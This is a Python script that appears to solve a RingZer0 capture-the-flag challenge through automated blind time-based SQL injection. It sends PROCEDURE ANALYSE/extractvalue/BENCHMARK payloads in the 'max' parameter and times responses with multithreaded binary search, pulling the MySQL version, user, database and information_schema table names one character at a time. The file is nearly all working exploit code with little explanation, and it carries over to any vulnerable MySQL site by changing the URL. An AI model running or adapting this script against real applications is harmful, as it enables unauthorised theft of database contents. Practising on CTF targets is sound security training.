import requests
import urllib3
import sys
import  threading
import time
# Target URL and suffix to sqli query
url = "http://challenges.ringzer0team.com:10189/clients.php?max="

# SQL Injection type based on inference type.
sqli_type = "time_based"

# Proxy settings
http_proxy = "http://127.0.0.1:8080"
https_proxy = "https://127.0.0.1:8080"
timeout = 2

# cookies + user agent, if required!
user_agent = 'Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0'

# Headers settings
headers = {'User-Agent': user_agent}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
result_length=0
result_index =1
result={}

# Class to manage threads
class ScanningThread(threading.Thread):

    def __init__(self,query,result,result_length):
        threading.Thread.__init__(self)
        self.query = query
        self.result = result
        self.result_length = result_length

    def run(self):
        # fetch position of character to fetch,
        # fetch char,
        # save in dictionary -> result
        while True:
            position = get_postion()
            if position == None:
                break
            c = char_at_position(self.query, position)
            if c==None:
                self.result[position] = '*'
            else:
                self.result[position] = chr(c)
            sys.stdout.write("\rCompleted: %d%% " % ((len(self.result) / self.result_length) * 100))
            for i in range(1, self.result_length + 1):
                if i in self.result:
                    sys.stdout.write(self.result[i])
                else:
                    sys.stdout.write("*")
            sys.stdout.flush()

#find length output of given query
def output_length(query):
    start_index = 0
    end_index = 2000
    while start_index < end_index:

        mid = start_index + int(( end_index - start_index )/2)
        action = url + "1,1+PROCEDURE+analyse((select+extractvalue(rand(),concat(0x3a,(IF(length("+query+")+between+"+str(start_index)+"+and+"+str(mid)+",BENCHMARK(4000000,SHA1(1)),1))))),1)"
        try:
            start_time = time.time()
            response = requests.get(action, headers=headers, allow_redirects=True,
                             proxies={"http": http_proxy, "https": https_proxy}, verify=False, timeout=timeout)
            end_time = time.time()
            print("response: " , str(end_time - start_time))
            start_index = mid + 1
        except requests.exceptions.Timeout:
            end_time = time.time()
            print("response: " , str(end_time - start_time))

            end_index = mid
        except:
            pass

    return start_index

#find length output of given query
def rows_count(query):
    start_index = 0
    end_index = 2000
    while start_index < end_index:

        mid = start_index + int(( end_index - start_index )/2)
        action = url + "1,1+PROCEDURE+analyse((select+extractvalue(rand(),concat(0x3a,(IF("+query+"+between+"+str(start_index)+"+and+"+str(mid)+",BENCHMARK(4000000,SHA1(1)),1))))),1)"
        try:
            start_time = time.time()
            response = requests.get(action, headers=headers, allow_redirects=True,
                             proxies={"http": http_proxy, "https": https_proxy}, verify=False, timeout=timeout)
            end_time = time.time()
            print("response: " , str(end_time - start_time))
            start_index = mid + 1
        except requests.exceptions.Timeout:
            end_time = time.time()
            print("response: " , str(end_time - start_time))

            end_index = mid
        except:
            pass

    return start_index

# fetch character for given position
def char_at_position(query, position):
    start_index = 0
    end_index = 256
    while start_index < end_index:
        mid = start_index + int(( end_index - start_index )/2)

        action = url + "1,1+PROCEDURE+analyse((select+extractvalue(rand(),concat(0x3a,(IF(ascii(substring(" + query + "," + str(position) + ",1))+between+" + str(
            start_index) + "+and+" + str(mid) + ",BENCHMARK(4000000,SHA1(1)),1))))),1)"
        try:
            response = requests.get(action, headers=headers, allow_redirects=True,
                                    proxies={"http": http_proxy, "https": https_proxy}, verify=False, timeout=timeout)

            start_index = mid + 1
        except requests.exceptions.Timeout:
            end_index = mid
        except:
            pass
    return start_index
# return position to threads
def get_postion():
    global result_index
    global  result_length
    ret = result_index
    if result_index < result_length+1:
        threadLock.acquire()

        result_index = result_index + 1

        threadLock.release()
        return ret
    return None

def get_query_results(query):
    global result_index
    global result_length
    result_index = 1

    result_length= output_length(query)

    print("Output Length: ", result_length)
    if result_length == 1999:
        print("Something is wrong! Please may there is not data")
        return


    # start threads
    result = {}
    threads = []
    for i in range(0, number_of_threads):
        threads.append(ScanningThread(query,result,result_length))

    for i in range(0, number_of_threads):
        threads[i].start()

    for i in range(0, number_of_threads):
        threads[i].join()
    # print result/output
    print()

    for i in range(1, result_length + 1):
        if i in result:
            print(result[i], end="")
        else:
            print("*")
    print("\n")

number_of_threads = 10

threadLock = threading.Lock()

#get_query_results("version()")
#get_query_results("user()")
#get_query_results("database()")

table = "information_schema.tables where table_schema like 0x73716c6932"
column = "concat(0x3a3a,table_name)"
count = rows_count("(select count(*) from "+table+")")

print("Rows Count: ",count)
# start program
for c in range(0,count,1):
    # take query from user
    query = "(select "+ column +" from "+table + " limit " +str(c)+ ",1)"

    #query = "database()" # input("sql> ")
    print("MySQL> select", query)
    get_query_results(query)
    # find length of output of query
